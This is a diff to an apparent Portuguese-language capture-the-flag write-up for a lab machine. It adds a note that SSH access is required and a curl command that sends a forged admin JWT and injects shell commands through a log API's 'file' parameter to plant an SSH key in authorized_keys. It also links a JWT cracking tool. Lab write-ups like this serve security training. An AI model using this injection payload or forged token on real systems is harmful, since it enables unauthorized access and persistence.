@@ -216,6 +216,11 @@ Connection: close
 ````
 
 user.txt => ddcf7f061fa3c3c2c6756391e57676d3
+Não é possível obter a flag desta forma, voce precisará logar na maquina por ssh
+
+````
+curl -i -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWQ5MDAwNTY2YTdlNTA0NjhhNGFlNGIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQxNjQ0NDc4fQ.x8I564heJ-uRhv3ks-x3ViNa_MOzTl1Vu9n0KnTN8Ck' -G --data-urlencode "file=index.js; mkdir -p /home/dasith/.ssh; echo $PUBLIC_KEY >> /home/dasith/.ssh/authorized_keys" 'http://10.10.11.120/api/logs'
+````
 
 Tool to crack JWT:
 https://lmammino.github.io/jwt-cracker/
